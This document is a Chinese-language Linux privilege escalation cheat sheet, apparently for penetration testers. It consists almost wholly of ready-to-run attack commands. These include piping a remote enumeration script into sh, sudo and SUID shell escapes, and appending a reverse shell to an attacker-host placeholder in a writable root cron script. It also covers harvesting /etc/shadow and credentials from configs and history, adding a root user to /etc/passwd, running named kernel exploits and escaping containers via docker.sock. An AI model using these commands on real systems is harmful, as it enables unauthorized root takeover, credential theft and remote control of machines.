# Linux 权限提升速查

> 配置错误优先，内核漏洞最后（可能宕机）。

## 0. 自动枚举（先跑）

```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# 或上传 LinEnum.sh / linux-exploit-suggester.sh
```

## 1. sudo 配置错误

```bash
sudo -l
```
有结果 → 查 https://gtfobins.github.io/ 。常见可利用：vim/find/nmap/python/perl/less/awk/env。
```bash
sudo find / -exec /bin/sh \; -quit
sudo python -c 'import os;os.system("/bin/bash")'
```
CVE-2021-3156 (Baron Samedit)：sudo 1.8.2-1.8.31p2 / 1.9.0-1.9.5p1 → `./sudo-hax-me-a-sandwich`

## 2. SUID 提权

```bash
find / -perm -4000 -type f 2>/dev/null
```
→ GTFOBins查SUID利用。重点：nmap/find/vim/bash/python/pkexec/env/cp。

## 3. Crontab 劫持

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
```
root执行的脚本且当前用户可写 → 写入反弹shell：
```bash
echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> /path/to/writable_script.sh
```

## 4. PATH 劫持

```bash
echo $PATH; find / -writable -type f 2>/dev/null | grep -E '\.(sh|py|pl)$'
```
SUID/cron调用相对路径命令 → PATH前面放同名恶意脚本。

## 5. 凭证收集 + /etc/passwd可写

```bash
cat /etc/shadow 2>/dev/null           # 可读 → john/hashcat
ls -la /etc/passwd                    # 可写 → 添加root用户
grep -r 'password' /var/www/ /opt/ /home/ 2>/dev/null
cat ~/.bash_history; cat /proc/self/environ
find / -name '*.conf' -o -name '*.ini' -o -name '*.env' 2>/dev/null | xargs grep -il pass
```
/etc/passwd可写：`echo 'hacker:$(openssl passwd hacked):0:0::/root:/bin/bash' >> /etc/passwd`

## 6. Capabilities

```bash
getcap -r / 2>/dev/null
```
python/perl/tar/gdb有cap_setuid → 直接提权。

## 7. NFS no_root_squash

```bash
cat /etc/exports 2>/dev/null | grep no_root_squash
```
有 → 攻击机mount该共享，以root写入SUID bash，目标机执行。

## 8. 内核漏洞（慎用）

```bash
uname -r; ./linux-exploit-suggester.sh
```

| CVE | 影响版本 | 利用 |
|-----|---------|------|
| CVE-2021-4034 (PwnKit) | 所有polkit发行版(2009-2022) | `./pwnkit` |
| CVE-2021-3156 (Baron Samedit) | sudo 1.8.2-1.8.31p2 / 1.9.0-1.9.5p1 | `./sudo-hax-me-a-sandwich` |
| CVE-2022-0847 (DirtyPipe) | 5.8 ≤ kernel < 5.16.11 | `./dirtypipe /etc/passwd` |
| CVE-2016-5195 (DirtyCow) | kernel < 4.8.3 | 编译exploit修改passwd |

## 9. 容器逃逸

```bash
cat /proc/1/cgroup | grep docker; ls -la /var/run/docker.sock; fdisk -l
```
docker.sock逃逸：`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
